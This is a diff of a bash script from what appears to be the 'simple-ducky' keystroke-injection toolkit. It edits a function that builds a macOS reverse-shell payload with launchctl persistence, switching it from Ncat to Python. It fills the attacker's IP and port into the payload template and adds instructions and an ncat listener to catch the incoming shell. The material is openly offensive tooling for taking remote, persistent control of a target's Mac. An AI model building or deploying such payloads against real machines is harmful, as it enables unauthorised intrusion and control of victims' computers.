@@ -2820,9 +2820,9 @@ f_wifunWIN8nouac(){
 f_osxrev(){
 	clear
 	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide a reverse shell."
-	echo -e "\e[1;31mNote:\e[0m Ncat will need to be installed for this payload to work."
+	echo -e "\e[1;31mNote:\e[0m Python will need to be installed for this payload to work."
 	echo -e "\e[1;31mTarget:\e[0m MAC OSX (Various)"
-	echo -e "\e[1;31mAuthor:\e[0m Sharkey"	
+	echo -e "\e[1;31mAuthor:\e[0m Kidovate"	
 	echo ""
 	read -p "Launchctl autostart label? " launchlabel
 	echo ""
@@ -2836,7 +2836,7 @@ f_osxrev(){
 	clear
 	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
 	echo ""
-	sed "/nc/s/ipport/$attackerip $attackerport/g" /usr/share/simple-ducky/payloads/osxrev.conf > /usr/share/simple-ducky/payload.txt
+	sed -e "s/attackerip/$attackerip/g" -e "s/attackerport/$attackerport/g" /usr/share/simple-ducky/payloads/osxrev.conf > /usr/share/simple-ducky/payload.txt
 	sed -i "1iDELAY $pausemilsec" /usr/share/simple-ducky/payload.txt
 	sed -i "s/someName/$launchlabel/g" /usr/share/simple-ducky/payload.txt
 	clear
@@ -2870,12 +2870,14 @@ f_osxrev(){
 		read -p "Press any key to contiue" enter
 	fi 
 	clear
+	echo "To catch your shell, use: "
+	echo "   ncat -l $attackerport"
 	read -p "Would you like me to setup a listener [y/n]? " listener
 	clear
 	if [ "$listener" == "n" ]; then
 		read -p "Would you like to return to the main menu [y/n]? " option
 	else 
-		x-terminal-emulator -e ncat -lvp $attackerport &
+		x-terminal-emulator -e ncat -vl $attackerport &
 		xdg-open /usr/share/simple-ducky/ &
 		clear
 		read -p "Would you like to return to the main menu [y/n]? " option
